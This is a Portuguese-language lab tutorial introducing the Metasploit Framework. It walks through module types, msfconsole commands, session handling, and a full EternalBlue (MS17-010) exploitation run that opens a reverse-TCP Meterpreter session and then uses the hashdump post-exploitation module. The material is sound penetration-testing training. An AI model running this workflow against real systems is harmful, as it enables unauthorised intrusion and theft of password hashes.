<!--
title: Metasploit I - O Básico
desc: Conceitos fundamentais da ferramenta de testes de invasão Metasploit Framework: módulos, payloads e listeners.
tags: tools, metasploit, exploit
readTime: 6 min
-->

<!-- ===================================== -->
<!--            METASPLOIT I               -->
<!-- ===================================== -->
<p align="center">
  <img src="https://img.shields.io/badge/Category-Offensive%20Security-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Focus-Exploitation%20Framework-blue?style=for-the-badge">
</p>
<p align="center">
  <img src="https://img.shields.io/badge/Platform-Multi--Plataforma-black?style=flat-square">
  <img src="https://img.shields.io/badge/Discipline-Penetration%20Testing-purple?style=flat-square">
  <img src="https://img.shields.io/badge/Level-Beginner%20→%20Intermediate-yellow?style=flat-square">
  <img src="https://img.shields.io/badge/Status-Lab%20Documentation-green?style=flat-square">
</p>

---

# 📚 Metasploit I
## Fundamentos do Framework de Exploração Mais Usado do Mercado
> Da anatomia dos módulos à execução prática de exploits e payloads: uma introdução ao Metasploit Framework, cobrindo todo o ciclo de vida do pentest, do reconhecimento à pós-exploração.

---
---
# Metasploit I

## Introdução

### O Cenário: Por que o Metasploit?

Imagine que você acaba de ser contratado para um projeto de teste de penetração na **Stratford Systems**, uma empresa de serviços financeiros de médio porte. Sua equipe concluiu a fase de reconhecimento. Vocês têm uma lista de endereços IP, portas abertas e alguns serviços que parecem promissores. Vocês até identificaram o que parece ser uma implementação desatualizada do SMB em um de seus servidores. A vulnerabilidade está lá, documentada em um aviso público com um número CVE e tudo mais.

**E agora?**

Você poderia criar seu próprio exploit do zero, mas isso exige:

- ⏰ **Tempo** - dias ou semanas de desenvolvimento
- 🛠️ **Habilidades especializadas** - conhecimento profundo de engenharia reversa
- 🧪 **Testes cuidadosos** - para evitar falhas no sistema alvo

Em um ataque real, o **tempo é essencial** e o cliente espera resultados. O que você precisa é de uma **estrutura**: um conjunto de ferramentas estruturado que:

- Organize milhares de exploits conhecidos
- Combine com os payloads corretos
- Forneça uma interface consistente para configurar, lançar e gerenciar ataques

Essa estrutura é o **Metasploit**.

![](https://www.rapid7.com/cdn/images/blt73dd7d45dad2663a/683ddbcbda5c309967a8333d/metasploit-ascii-1.png)

### O que é o Metasploit Framework?

O **Metasploit Framework** é a estrutura de exploração de código aberto **mais utilizada** na indústria de testes de penetração.

**Histórico:**

- 🗓️ **2003** - Criado por HD Moore como uma ferramenta de rede portátil
- 🏢 **2009** - Adquirido pela Rapid7
- 📊 **Atualmente** - Mais de **2.600 exploits** e **6.100 módulos** no total

**Analogia:**  
Imagine uma **oficina bem organizada**. Ninguém constrói uma casa apenas com um martelo; são necessárias serras, furadeiras, níveis, trenas e parafusos, tudo organizado para que se encontre a ferramenta certa para cada tarefa. O Metasploit funciona da mesma maneira. Em vez de obrigá-lo a procurar scripts de exploração individuais espalhados pela internet, ele fornece uma **biblioteca centralizada** de:

- Exploits
- Scanners
- Payloads
- Ferramentas de pós-exploração

Tudo acessível por meio de uma única interface de linha de comando chamada `msfconsole`.

### Suporte ao Ciclo de Vida do Pentest

O Metasploit suporta **todo o ciclo de vida** dos testes de penetração:

|Fase|Descrição|Módulos Típicos|
|---|---|---|
|**1. Coleta de informações**|Escaneamento de alvos e coleta de impressões digitais|`auxiliary/scanner/`|
|**2. Identificação de vulnerabilidades**|Detecção de falhas conhecidas|`auxiliary/scanner/`, `check`|
|**3. Exploração**|Execução do código de exploração|`exploit/`|
|**4. Pós-exploração**|Manutenção do acesso, coleta de dados, pivoting|`post/`|
|**5. Relatórios**|Registro das descobertas|Ferramentas externas|

### Duas Versões: Pro vs. Framework

|Aspecto|Metasploit Pro|Metasploit Framework|
|---|---|---|
|**Tipo**|Comercial|Código aberto|
|**Interface**|GUI + CLI|Apenas CLI|
|**Recursos**|Automação, relatórios, colaboração|Núcleo da estrutura|
|**Custo**|Licenciado|Gratuito|
|**Uso**|Equipes profissionais|Pentesters, pesquisadores|

> **Nota:** Todas as técnicas que você aprende com o Metasploit Framework são **diretamente aplicáveis** ao Metasploit Pro. Os módulos, comandos e conceitos subjacentes são idênticos; o Pro simplesmente adiciona uma interface gráfica e uma camada de automação.

### Os Três Pilares da Estrutura

O Metasploit Framework é construído em torno de três componentes principais:

#### 1. Msfconsole

`msfconsole` é a principal interface de linha de comando. É onde você passará a maior parte do seu tempo. A partir dele, você pode:

- Pesquisar módulos    
- Configurar parâmetros
- Executar exploits
- Gerenciar sessões

> **Analogia:** Considere-o o **cockpit** do framework; tudo o mais é acessado por meio dele.

#### 2. Módulos

Os módulos são os **blocos de construção** do Metasploit. Cada módulo é um trecho de código independente, projetado para executar uma tarefa específica. Existem **sete categorias** de módulos que exploraremos em detalhes.

#### 3. Ferramentas

Além do `msfconsole`, o framework inclui ferramentas de linha de comando independentes:

- **`msfvenom`** - Gera payloads fora do `msfconsole` (abordado em detalhes na sala de Geração de Payloads)
- **`pattern_create`** e **`pattern_offset`** - Usadas no desenvolvimento de exploits
- **`msfdb`** - Gerencia o banco de dados do Metasploit

---
## Conceitos básicos e tipos de módulos

## Conceitos Básicos e Tipos de Módulos

### A Cadeia de Exploração: Vulnerabilidade, Exploit, Payload

Você identificou um serviço vulnerável. Os resultados da verificação mostram uma versão desatualizada do Apache com uma falha conhecida de execução remota de código. Você tem o número CVE, tem o IP de destino e tem o Metasploit aberto à sua frente. Mas antes de começar a procurar módulos, você precisa entender três conceitos fundamentais.

**Analogia com segurança física:**

|Conceito|Analogia|Definição Técnica|
|---|---|---|
|**Vulnerabilidade**|Fechadura quebrada na porta|Falha de projeto, codificação ou configuração que cria uma _oportunidade_ para dano|
|**Exploit**|Arrombar a porta|Código que explora a vulnerabilidade específica e a aciona de forma controlada|
|**Payload**|O que o invasor faz dentro|Código executado _após_ a exploração bem-sucedida|

**A Cadeia:**

```text
Vulnerabilidade → Exploit → Payload → Acesso
```

- Um **exploit sem payload** pode explorar uma vulnerabilidade, mas não produz nenhum resultado útil
- Um **payload sem exploit** não tem como alcançar o alvo

A arquitetura do Metasploit é construída em torno da combinação do **exploit correto** com a **carga útil correta** para uma determinada vulnerabilidade.

### As Sete Categorias de Módulos

|Categoria|Descrição|Exemplo|Quando Usar|
|---|---|---|---|
|**1. Exploits**|Exploram vulnerabilidades específicas|`exploit/windows/smb/ms17_010_eternalblue`|Para obter acesso inicial|
|**2. Auxiliares**|Tudo que não envolve exploração direta|`auxiliary/scanner/portscan/tcp`|Scanners, força bruta, fuzzers|
|**3. Payloads**|Código executado após exploração|`windows/x64/meterpreter/reverse_tcp`|Para estabelecer acesso|
|**4. Pós-exploração**|Executados após acesso obtido|`post/windows/gather/hashdump`|Enumeração, coleta de dados|
|**5. Codificadores**|Transformam payloads para evasão|`x86/shikata_ga_nai`|Ofuscação, remoção de caracteres inválidos|
|**6. NOPs**|Sequências "no operation"|`x86/opty2`|Preenchimento para exploits de buffer overflow|
|**7. Evasão**|Contornam controles de segurança|`evasion/windows/windows_defender_exe`|Bypass de AV/EDR|

### Tipos de Payload: Singles, Stagers e Stages

Dentro da categoria de payloads, o Metasploit distingue três tipos:

#### 1. Payloads Singles (Inline)

- **Autossuficientes** - toda a carga útil é entregue em um único pacote 
- **Maiores** - tudo está em uma única peça
- **Mais confiáveis** - não há um segundo download que possa falhar

**Exemplo:** `windows/x64/shell_reverse_tcp`

#### 2. Stagers

- **Pequenos e leves** - única função é estabelecer comunicação
- **Conectam** e baixam o segundo componente
- **Menor pegada** inicial

**Exemplo:** `windows/x64/meterpreter/reverse_tcp` (parte do staged)

#### 3. Stages

- **Componentes maiores** baixados pelo stager
- Formam uma **carga útil em estágios** com o stager
- **Desvantagem:** a conexão deve permanecer estável para o download

**Exemplo:** O Meterpreter completo é baixado como um stage

### Lendo a Convenção de Nomenclatura

O Metasploit usa o caminho do payload para determinar se ele é dividido em etapas (staged) ou único (single):

|Padrão|Significado|Exemplo|
|---|---|---|
|**Sublinhado** (`_`)|Payload **único** (inline)|`windows/x64/shell_reverse_tcp`|
|**Barra** (`/`)|Payload **em etapas** (staged)|`windows/x64/shell/reverse_tcp`|

**Padrão de nomenclatura:**

```text
<arquitetura>/<plataforma>/<tipo>/<conexão>
```

|Componente|Exemplo|Significado|
|---|---|---|
|Arquitetura|`x64`|64-bit|
|Plataforma|`windows`|Windows|
|Tipo|`meterpreter`|Meterpreter shell|
|Conexão|`reverse_tcp`|Conexão TCP reversa|

### Entendendo as Classificações de Exploit

A coluna **"Rank"** (Classificação) nos resultados da pesquisa indica a **confiabilidade esperada** de um exploit:

|Classificação|Significado|Taxa de Sucesso|
|---|---|---|
|**Excellent**|Nunca causa falha no serviço (SQLi, RCE)|>95%|
|**Great**|Detecção automática da configuração|90-95%|
|**Good**|Funciona no caso mais comum|80-90%|
|**Normal**|Funciona contra versão específica|70-80%|
|**Average**|Geralmente não confiável|50-70%|
|**Low**|Sucesso em menos de 50%|<50%|
|**Manual**|Requer configuração significativa|<15%|

> ⚠️ **Importante:** Uma classificação mais alta **não garante** o sucesso. Fatores ambientais (configuração do alvo, rede, controles de segurança) desempenham um papel importante. Use a classificação como um **ponto de partida**, não como uma garantia.

---
## Navegando no Msfconsole

### Iniciando o Msfconsole

Abra um terminal e digite `msfconsole`:

```bash
msfconsole
```

Resultado:

```text
Metasploit tip: Use the 'favorite' command to mark
frequently used modules

 =[ metasploit v6.4.x                          ]
+ -- --=[ 2607 exploits - 1325 auxiliary - 435 post       ]
+ -- --=[ 1710 payloads - 49 encoders - 14 nops          ]
+ -- --=[ 12 evasion                                      ]

msf6 >
```

**O que observamos:**

- Banner ASCII aleatório a cada inicialização (puramente decorativo)
- Versão do framework
- Contagem de módulos em cada categoria
- Prompt mudou para `msf6 >` (dentro do Metasploit)

> **Nota:** O prefixo `msf6` reflete a versão principal. Instalações mais antigas podem exibir `msf5`. Os comandos e conceitos são os mesmos.

### Executando Comandos Linux no Msfconsole

Uma característica conveniente: `msfconsole` suporta a maioria dos comandos Linux padrão:

```text
msf6 > whoami
[*] exec: whoami

root
msf6 > ip -br a show ens5
[*] exec: ip -br a show ens5

ens5             UP             CONNECTION_IP/18 metric 100 fe80::3:35ff:fed5:91ed/64
```

**Útil durante ataques para:**

- Confirmar seu endereço IP (`LHOST`)
- Verificar conectividade de rede
- Ler arquivos sem sair do console

**⚠️ Limitação:** O redirecionamento de saída não funciona:

```text
msf6 > help > output.txt
[-] No such command
msf6 >
```

Use `spool` para registrar saída ou saia do `msfconsole`.

### Como Obter Ajuda

O comando `help` exibe a lista completa de comandos disponíveis:

```text
msf6 > help search
Usage: search [<options>] [<keywords>:<values>]

Prepend a value with '-' to exclude any matching results.
If no options or keywords are provided, cached results are shown.

OPTIONS:
 -h, --help                      Help banner
 -o, --output <filename>         Send output to a file in csv format
 -r, --sort-reverse <column>     Reverse sort results by the specified column
 -s, --sort-column <column>      Sort results by the specified column
 -S, --filter <filter>           Regex filter
 -u, --use                       Use module if a single result is found

Keywords:
 aka         :  Modules with a matching AKA (also-known-as) name
 author      :  Modules written by this author
 arch        :  Modules affecting this architecture
 check       :  Modules that support the 'check' method
 CVE         :  Modules with a matching CVE ID
 edb         :  Modules with a matching Exploit-DB ID
 fullname    :  Modules with a matching full name
 name        :  Modules with a matching descriptive name
 platform    :  Modules affecting this platform
 ref         :  Modules with a matching ref
 target      :  Modules with a matching target
 type        :  Modules of a specific type (exploit, auxiliary, post, payload, nop, encoder, evasion)

Examples:
 search cve:2009 type:exploit
 search cve:2024 platform:windows type:exploit
 search name:smb type:auxiliary

msf6 >
```

**Padrão a lembrar:** Quando não tiver certeza sobre a sintaxe, `help <comando>` dá a resposta sem sair do console.

### Histórico e Autocompletar com Tab

**Histórico:**

```text
msf6 > history
1  search type:exploit platform:windows smb
2  use exploit/windows/smb/ms17_010_eternalblue
3  show options
4  set RHOSTS MAHCHINE_IP
5  run
6  back
7  search type:auxiliary ssh
msf6 >
```

**Navegação:**

- ⬆️ **Seta para cima** - Comando anterior
- ⬇️ **Seta para baixo** - Próximo comando

**Autocompletar com Tab:**  
Digite `use exploit/windows/smb/ms17` e pressione **Tab** → O console completa automaticamente o caminho.

Economiza **tempo considerável**, especialmente com caminhos de módulos profundamente aninhados.

### Buscando Módulos

Com mais de 6.100 módulos, encontrar o certo é uma **habilidade crucial**.

#### Pesquisa Básica

```text
msf6 > search eternalblue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload
[...]
```

**Análise das colunas:**

|Coluna|Significado|
|---|---|
|`#`|Índice numérico (use `use 0` ou `info 0`)|
|`Name`|Caminho completo do módulo|
|`Disclosure Date`|Data de divulgação pública|
|`Rank`|Confiabilidade do módulo|
|`Check`|Suporta verificação não destrutiva|
|`Description`|Resumo do módulo|

#### Pesquisa Filtrada

Combine palavras-chave com filtros para resultados mais direcionados:

|Filtro|Uso|Exemplo|
|---|---|---|
|`type:`|Categoria do módulo|`type:exploit`|
|`platform:`|Sistema operacional|`platform:windows`|
|`cve:`|Número CVE|`cve:2017-0144`|
|`name:`|Nome do módulo|`name:smb`|

**Exemplos:**

```text
# Módulos auxiliares relacionados a SMB
search type:auxiliary name:smb

# Exploits para Windows com CVE específica
search cve:2024 platform:windows type:exploit

# Excluir resultados (sinal de menos)
search type:exploit -platform:windows
```

### Inspecionando um Módulo com Info

O comando `info` fornece informações detalhadas:

```text
msf6 > info exploit/windows/smb/ms17_010_eternalblue

 Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
 Module: exploit/windows/smb/ms17_010_eternalblue
 Platform: Windows
 Arch:
 Privileged: Yes
 License: Metasploit Framework License (BSD)
 Rank: Average
 Disclosed: 2017-03-14

Provided by:
 Equation Group
 Shadow Brokers
 sleepya
 thelightcosine

Available targets:
 Id  Name
 --  ----
 =>  0   Automatic Target

Check supported:
 Yes

Basic options:
 Name           Current Setting  Required  Description
 ----           ---------------  --------  -----------
 RHOSTS                          yes       The target host(s)
 RPORT          445              yes       The target port (TCP)
 SMBDomain                       no        (Optional) The Windows domain to use for authentication
 SMBPass                         no        (Optional) The password for the specified username
 SMBUser                         no        (Optional) The username to authenticate as
 VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
 VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Description:
 This module is a port of the Equation Group ETERNALBLUE exploit,
 part of the FuzzBunch toolkit released by Shadow Brokers. [...]

References:
 https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
 https://nvd.nist.gov/vuln/detail/CVE-2017-0144
 [...]

Also known as:
 ETERNALBLUE
```

**Campos-chave a observar:**

- **`Privileged: Yes`** → Exploração bem-sucedida concede privilégios elevados (SYSTEM/root)
- **`Check supported: Yes`** → Pode verificar vulnerabilidade sem enviar exploit
- **`Available targets`** → Opções de configuração do alvo
- **`Basic options`** → Parâmetros obrigatórios e opcionais

### Sobre o EternalBlue (CVE-2017-0144)

**EternalBlue** é uma vulnerabilidade crítica de estouro de buffer no protocolo SMBv1 da Microsoft.

|Aspecto|Detalhe|
|---|---|
|**CVE**|CVE-2017-0144|
|**Descoberta**|NSA (Agência de Segurança Nacional dos EUA)|
|**Vazamento**|Abril de 2017 (Shadow Brokers)|
|**Impacto**|WannaCry ransomware (maio de 2017)|
|**Sistemas afetados**|Windows 7, 8, 10, Server 2008, 2012, 2016|

**Por que usamos este exemplo?**

- ✅ Bem documentado
- ✅ Confiável em laboratório
- ✅ Ilustra claramente o fluxo de trabalho de exploração    

> ⚠️ Em um ataque real, você não se limitaria a uma única vulnerabilidade de 2017.

---
## Configurando e executando módulos

### Conheça seu Prompt

Cinco prompts distintos. Cada um informa _onde_ você está e _quais comandos estão disponíveis_:

|Prompt|Contexto|O que você pode fazer|
|---|---|---|
|`root@CONNECTION_IP~#`|Terminal Linux padrão|Apenas comandos Linux|
|`msf6 >`|Msfconsole, sem módulo|`search`, `use`, `sessions`, `setg`|
|`msf6 exploit(nome) >`|Contexto do módulo|`set`, `show options`, `exploit`, `check`, `back`|
|`meterpreter >`|Sessão Meterpreter|`sysinfo`, `getuid`, `hashdump`, `shell`|
|`C:\Windows\system32>`|Shell do sistema alvo|Comandos do sistema operacional alvo|

> 💡 **Dica de diagnóstico:** Se um comando não estiver funcionando, verifique em qual prompt você está.

### Selecionando um módulo com uso

```shell-session
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

**O que aconteceu:**

1. Prompt mudou para refletir o módulo carregado
2. Metasploit selecionou automaticamente um payload padrão

**Para sair do contexto:**

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 >
```

### Exibindo Opções

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

 Name           Current Setting  Required  Description
 ----           ---------------  --------  -----------
 RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
 RPORT          445              yes       The target port (TCP)
 SMBDomain                       no        (Optional) The Windows domain to use for authentication
 SMBPass                         no        (Optional) The password for the specified username
 SMBUser                         no        (Optional) The username to authenticate as
 VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
 VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Payload options (windows/x64/meterpreter/reverse_tcp):

 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
 EXITFUNC  thread           yes       Exit technique (Accepted: ", seh, thread, process, none)
 LHOST     CONNECTION_IP    yes       The listen address (an interface may be specified)
 LPORT     4444             yes       The listen port

Exploit target:

 Id  Name
 --  ----
 0   Automatic Target

msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

**Três seções importantes:**

1. **Module options** - Parâmetros específicos do exploit
    
2. **Payload options** - Parâmetros do payload selecionado
    
3. **Exploit target** - Versão/configuração do alvo
    

**Coluna `Required: yes`** = Você deve definir um valor antes de executar.

### Parâmetros Principais

|Parâmetro|Descrição|Exemplo|
|---|---|---|
|**RHOSTS**|Host(s) remoto(s) - alvo|`MACHINE_IP`, `192.168.1.0/24`|
|**RPORT**|Porta remota - serviço alvo|`445` (SMB), `80` (HTTP)|
|**LHOST**|Host local - sua máquina|`10.8.0.1` (VPN)|
|**LPORT**|Porta local - seu listener|`4444`, `443`|
|**PAYLOAD**|Payload a ser entregue|`windows/x64/meterpreter/reverse_tcp`|
|**SESSION**|Sessão existente (pós-exploração)|`1`, `2`, `3`|

### Configurando Parâmetros

**Local (set):**

```text
msf6 exploit(...) > set RHOSTS MACHINE_IP
RHOSTS => MACHINE_IP
msf6 exploit(...) > set LPORT 5555
LPORT => 5555
```

**Global (setg) - persiste em todos os módulos:**

```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > setg RHOSTS MACHINE_IP
RHOSTS => MACHINE_IP
msf6 exploit(...) > back
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(...) > show options
# RHOSTS já está preenchido!
```

**Limpar parâmetros:**

```text
# Limpar um parâmetro
msf6 > unset RHOSTS
# Limpar todos os parâmetros (local)
msf6 > unset all
# Limpar parâmetro global
msf6 > unsetg RHOSTS
```

**Regra prática:**

- Use `setg` para valores constantes (`RHOSTS`, `LHOST`)
- Use `set` para valores específicos de módulo (`RPORT`, `PAYLOAD`, `SESSION`)

### Selecionando uma Carga Útil Diferente

```text
msf6 exploit(...) > show payloads

Compatible Payloads
===================
 #   Name                                                Rank    Description
 -   ----                                                ----    -----------
 0   generic/custom                                      manual  Custom Payload
 1   generic/shell_bind_tcp                              manual  Generic Command Shell, Bind TCP Inline
 2   generic/shell_reverse_tcp                           manual  Generic Command Shell, Reverse TCP Inline
 3   windows/x64/exec                                    manual  Windows x64 Execute Command
 4   windows/x64/meterpreter/bind_tcp                    manual  Windows Meterpreter, Bind TCP Stager
 5   windows/x64/meterpreter/reverse_tcp                 manual  Windows Meterpreter, Reverse TCP Stager
 6   windows/x64/meterpreter_reverse_tcp                 manual  Windows Meterpreter Shell, Reverse TCP Inline
 7   windows/x64/shell/reverse_tcp                       manual  Windows x64 Command Shell, Reverse TCP Stager
```

**Para alternar:**

```text
msf6 exploit(...) > set PAYLOAD windows/x64/shell/reverse_tcp
PAYLOAD => windows/x64/shell/reverse_tcp
```

### Executando o Módulo

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on CONNECTION_IP:4444
[*] MACHINE_IP:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] MACHINE_IP:445 - Host is likely VULNERABLE to MS17-010!
[*] MACHINE_IP:445 - Connecting to target for exploitation.
[+] MACHINE_IP:445 - Connection established for exploitation.
[*] MACHINE_IP:445 - Trying exploit with 12 Groom Allocations.
[*] Sending stage (201283 bytes) to MACHINE_IP
[*] Meterpreter session 1 opened (CONNECTION_IP:4444 -> MACHINE_IP:49186)

meterpreter >
```

**Fluxo da execução:**

1. ✅ Listener iniciado na sua máquina
2. ✅ Verificação de vulnerabilidade (check)
3. ✅ Envio do exploit
4. ✅ Payload executado no alvo
5. ✅ Conexão reversa estabelecida
6. ✅ Sessão aberta

**`run` vs `exploit` (são equivalentes):**

- `run` - mais natural para módulos auxiliares
- `exploit` - mais natural para módulos de exploração
- Ambos funcionam em qualquer contexto

**Executar em segundo plano (`-z`):**

```text
msf6 exploit(...) > exploit -z
[*] Meterpreter session 1 opened
[*] Session 1 created in the background.
msf6 exploit(...) >
```

### Verificar Antes de Explorar

O comando `check` sonda o alvo sem enviar o exploit:

```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > check

[*] MACHINE_IP:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] MACHINE_IP:445 - Host is likely VULNERABLE to MS17-010!
[*] MACHINE_IP:445 - Scanned 1 of 1 hosts (100% complete)
```

**Benefícios:**

- ✅ Confirma vulnerabilidade sem risco de falha
- ✅ Evita disparar alertas desnecessários
- ✅ Mais seguro em ambientes de produção

> **Nota:** Nem todos os módulos suportam `check` (veja a coluna "Check" nos resultados da pesquisa).

---
## Gerenciamento de Sessões

### O que é uma Sessão?

Uma **sessão** no Metasploit é um canal de comunicação ativo entre sua máquina atacante e um alvo comprometido.

**Tipos de sessão:**

|Tipo|Descrição|Exemplo|
|---|---|---|
|**Meterpreter**|Ambiente rico e interativo|`meterpreter >`|
|**Shell**|Linha de comando básica do SO|`C:\Windows\system32>`|
|**Protocolo Específico**|Acesso a serviços (SMB, MSSQL)|`mssql >`|

### Colocando uma Sessão em Segundo Plano

```text
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

**Atalho:** `CTRL+Z` (funciona igual ao `background`)

### Listando Sessões Ativas

```text
msf6 > sessions

Active sessions
===============
 Id  Name  Type                  Information            Connection
 --  ----  ----                  -----------            ----------
 1         meterpreter x64/wind  NT AUTHORITY\SYSTEM @  10.81.117.184:4444 ->
            ows                    STRATFORD-WS01         10.81.162.215:49159
 2         meterpreter x64/wind  NT AUTHORITY\SYSTEM @  10.81.117.184:4445 ->
            ows                    STRATFORD-WS01         10.81.162.215:49161
```

**Colunas:**

- `Id` - Identificador único (use com `sessions -i`)    
- `Name` - Rótulo opcional (defina com `sessions -n <nome> -i <id>`)
- `Type` - Tipo e arquitetura
- `Information` - Contexto do usuário e nome do host
- `Connection` - Par IP:porta local e remoto

### Interagindo com uma Sessão

```text
# Retornar a uma sessão
msf6 > sessions -i 1
[*] Starting interaction with 1...
meterpreter >
# Alternar entre sessões (colocar atual em segundo plano)
meterpreter > background
msf6 exploit(...) > sessions -i 2
[*] Starting interaction with 2...
meterpreter >
```

### Encerrando Sessões

```text
# Encerrar uma sessão específica
msf6 > sessions -k 2
[*] Killing session 2

# Encerrar todas as sessões
msf6 > sessions -K
[*] Killing all sessions...
```

> ⚠️ **Cuidado:** `-K` (maiúsculo) encerra **todas** as sessões. Use com cautela em engajamentos reais.

### Sessões e Módulos Pós-Exploração

Módulos `post/` requerem uma sessão existente:

```text
msf6 > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/hashdump) > run
```

**Fluxo de trabalho:**

1. Explore uma vulnerabilidade → abra sessão Meterpreter    
2. Contextualize a sessão (segundo plano)
3. Carregue módulo de pós-exploração com `use`
4. Defina o parâmetro `SESSION`
5. Execute o módulo

### Sessões vs Múltiplos Alvos

**Cenário real:** Engajamento com 12 hosts em duas sub-redes

|Comando|Uso|
|---|---|
|`sessions`|Listar todas as sessões ativas|
|`sessions -i <id>`|Interagir com uma sessão específica|
|`background`|Colocar sessão atual em segundo plano|
|`sessions -n <nome> -i <id>`|Nomear uma sessão|
|`sessions -k <id>`|Encerrar uma sessão|

---

## Checklist do Pentester

### Fase 1: Inicialização (2-3 minutos)

- **Iniciar msfconsole**

```bash
msfconsole
```

- **Verificar banco de dados**

```bash
db_status
# Se não estiver conectado:
msfdb init
msfdb start
```

- **Definir variáveis globais**

```text
setg RHOSTS <target>
setg LHOST <your_ip>
setg LPORT 4444
```

### Fase 2: Pesquisa e Seleção (5-10 minutos)

- **Pesquisar módulos relevantes**

```text
search <keyword>
search type:exploit platform:windows <service>
```

- **Inspecionar módulo**

```text
info <module_path>
info <index_number>
```

- **Carregar módulo**

```text
use <module_path>
use <index_number>
```

### Fase 3: Configuração (3-5 minutos)

- **Verificar opções obrigatórias**

```text
show options
```

- **Definir parâmetros**

```text
set RHOSTS <target_ip>
set RPORT <port>
set PAYLOAD <payload>
set LHOST <your_ip>
set LPORT <port>
```

- **Verificar configuração**

```text
show options
check  # Se suportado
```

### Fase 4: Execução (1-2 minutos)

- **Executar exploit**

```text
exploit
# ou
run
```

- **Executar em segundo plano (se necessário)**

```text
exploit -z
```

### Fase 5: Pós-Exploração

- **Gerenciar sessões**

```text
sessions
sessions -i <id>
background
```

- **Carregar módulos pós-exploração**

```text
use post/windows/gather/hashdump
set SESSION <id>
run
```

### Comandos de Emergência

| Situação             | Comando                                  |
| -------------------- | ---------------------------------------- |
| Comando não funciona | Verificar prompt atual                   |
| Erro de configuração | `show options` para verificar parâmetros |
| Sessão perdida       | `sessions` para verificar ativas         |
| Exploit travado      | `CTRL+C` para interromper                |
| Sair do msfconsole   | `exit`                                   |

---

## Referências

### Documentação Oficial

**Metasploit:**

- [Metasploit Framework Documentation](https://www.metasploit.com/)
- [Metasploit Unleased](https://www.offensive-security.com/metasploit-unleashed/) - Curso completo
- [Metasploit GitHub Repository](https://github.com/rapid7/metasploit-framework)
- [Metasploit API Documentation](https://docs.metasploit.com/)

**Rapid7 Resources:**

- [Metasploit Pro](https://www.rapid7.com/products/metasploit/)
- [Metasploit Community Edition](https://www.rapid7.com/products/metasploit/download/)
- [Rapid7 Blog - Metasploit](https://www.rapid7.com/blog/tag/metasploit/)

### CVEs Mencionadas

- [CVE-2017-0144 - EternalBlue](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- [MS17-010 Security Update](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010)

### Ferramentas Relacionadas

- [msfvenom Documentation](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [Nmap Integration with Metasploit](https://nmap.org/book/nse-msf.html)
- [Armitage - GUI para Metasploit](http://www.fastandeasyhacking.com/)

### Recursos de Aprendizado

**Cursos:**

- [Offensive Security - Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [PortSwigger Web Security Academy - Metasploit](https://portswigger.net/web-security/learning-paths)
- [TryHackMe - Metasploit Rooms](https://tryhackme.com/room/metasploitintro)

**Livros:**

- "Metasploit: The Penetration Tester's Guide" - David Kennedy et al.
- "The Web Application Hacker's Handbook" - Stuttard & Pinto
- "Penetration Testing: A Hands-On Introduction to Hacking" - Georgia Weidman

### Comunidade

- [#Metasploit on Discord](https://discord.gg/metasploit)
- [Metasploit Subreddit](https://www.reddit.com/r/metasploit/)
- [Rapid7 Community](https://community.rapid7.com/)
